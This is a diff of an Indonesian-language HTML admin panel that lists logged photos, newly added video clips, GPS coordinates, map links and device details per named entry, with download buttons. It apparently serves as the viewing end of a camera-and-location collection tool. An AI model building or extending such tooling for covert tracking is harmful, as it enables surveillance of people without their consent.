@@ -3,11 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Admin Panel - Foto & Lokasi</title>
+    <title>Admin Panel - Foto, Rekaman & Lokasi</title>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
         body { background-color: #0f172a; color: #f8fafc; padding: 20px; }
-        .container { max-width: 900px; margin: 0 auto; }
+        .container { max-width: 940px; margin: 0 auto; }
 
         #loginScreen {
             max-width: 360px;
@@ -49,24 +49,36 @@
             display: flex; justify-content: space-between; align-items: center;
             flex-wrap: wrap; gap: 16px;
         }
-        .log-left { display: flex; gap: 16px; align-items: center; flex-wrap: wrap; }
-        .photo-thumb {
-            width: 120px; height: 90px; object-fit: cover;
-            border-radius: 8px; border: 1px solid #475569; background: #0f172a;
+        .log-left { display: flex; gap: 16px; align-items: center; flex-wrap: wrap; flex: 1; }
+        .media-box {
+            width: 170px; height: 128px; border-radius: 8px;
+            border: 1px solid #475569; background: #0f172a;
+            overflow: hidden; display: flex; align-items: center; justify-content: center;
+        }
+        .media-box img, .media-box video {
+            width: 100%; height: 100%; object-fit: cover;
         }
         .log-info h3 { font-size: 16px; color: #fff; margin-bottom: 6px; }
         .log-info p { font-size: 13px; color: #94a3b8; margin-bottom: 4px; }
         .badge {
             display: inline-block; background: rgba(59, 130, 246, 0.15);
-            color: #60a5fa; padding: 3px 8px; border-radius: 6px; font-size: 11px;
+            color: #60a5fa; padding: 3px 8px; border-radius: 6px; font-size: 11px; margin-left: 4px;
         }
-        .device-info { font-size: 11px !important; color: #64748b !important; max-width: 460px; word-break: break-all; }
-        .btn-map {
-            background: #10b981; color: #fff; text-decoration: none;
-            padding: 10px 16px; border-radius: 8px; font-size: 13px; font-weight: 600;
+        .badge-rec {
+            background: rgba(239, 68, 68, 0.18);
+            color: #f87171;
+        }
+        .device-info { font-size: 11px !important; color: #64748b !important; max-width: 440px; word-break: break-all; }
+        .card-actions { display: flex; flex-direction: column; gap: 8px; min-width: 165px; }
+        .btn-map, .btn-dl {
+            color: #fff; text-decoration: none; text-align: center;
+            padding: 9px 14px; border-radius: 8px; font-size: 12px; font-weight: 600;
             display: inline-block;
         }
+        .btn-map { background: #10b981; }
         .btn-map:hover { background: #059669; }
+        .btn-dl { background: #475569; }
+        .btn-dl:hover { background: #334155; }
         .empty-state { text-align: center; padding: 40px; color: #64748b; }
     </style>
 </head>
@@ -82,7 +94,7 @@
     <div id="dashboard">
         <div class="header">
             <div>
-                <h1>📷 Data Foto & Lokasi Masuk</h1>
+                <h1>📍📷 Log Lokasi, Foto & Rekaman</h1>
                 <p style="font-size: 13px; color: #94a3b8; margin-top: 4px;">Total tercatat: <span id="totalCount">0</span></p>
             </div>
             <div class="actions">
@@ -130,25 +142,46 @@
                 return;
             }
 
-            container.innerHTML = logs.map(item => {
+            container.innerHTML = logs.map((item, idx) => {
                 const hasPhoto = typeof item.foto === "string" && item.foto.startsWith("data:image/");
+                const hasVideo = typeof item.video === "string" && item.video.startsWith("data:video/");
                 const hasCoords = item.lat !== null && item.lat !== undefined && item.lng !== null && item.lng !== undefined;
-                const mapBtn = hasCoords
+
+                let mediaHtml = `<span style="font-size:11px;color:#64748b;">Tidak ada media</span>`;
+                let downloadHtml = "";
+
+                if (hasVideo) {
+                    mediaHtml = `<video src="${item.video}" controls playsinline></video>`;
+                    const ext = item.video.includes("mp4") ? "mp4" : "webm";
+                    downloadHtml = `<a class="btn-dl" href="${item.video}" download="rekaman_${item.id || idx}.${ext}">⬇ Unduh Rekaman</a>`;
+                } else if (hasPhoto) {
+                    mediaHtml = `<img src="${item.foto}" alt="Foto">`;
+                    downloadHtml = `<a class="btn-dl" href="${item.foto}" download="foto_${item.id || idx}.jpg">⬇ Unduh Foto</a>`;
+                }
+
+                const mapHtml = hasCoords
                     ? `<a class="btn-map" href="https://www.google.com/maps?q=${item.lat},${item.lng}" target="_blank">Buka di Google Maps ↗</a>`
                     : `<span class="badge">Tanpa Koordinat</span>`;
+
+                const typeBadge = hasVideo
+                    ? `<span class="badge badge-rec">REKAMAN KLIP</span>`
+                    : `<span class="badge">FOTO</span>`;
 
                 return `
                     <div class="log-card">
                         <div class="log-left">
-                            ${hasPhoto ? `<img class="photo-thumb" src="${item.foto}" alt="Foto">` : `<div class="photo-thumb"></div>`}
+                            <div class="media-box">${mediaHtml}</div>
                             <div class="log-info">
-                                <h3>${escapeHtml(item.nama)} <span class="badge">GPS: ${escapeHtml(item.akurasi || "-")}</span></h3>
+                                <h3>${escapeHtml(item.nama)} ${typeBadge} <span class="badge">GPS: ${escapeHtml(item.akurasi || "-")}</span></h3>
                                 <p>🕒 <strong>Waktu:</strong> ${escapeHtml(item.waktu || "-")}</p>
                                 <p>🌐 <strong>Koordinat:</strong> ${hasCoords ? `${item.lat}, ${item.lng}` : "Tidak tersedia"}</p>
                                 <p class="device-info">📱 ${escapeHtml(item.perangkat || "")}</p>
                             </div>
                         </div>
-                        <div>${mapBtn}</div>
+                        <div class="card-actions">
+                            ${mapHtml}
+                            ${downloadHtml}
+                        </div>
                     </div>
                 `;
             }).join('');
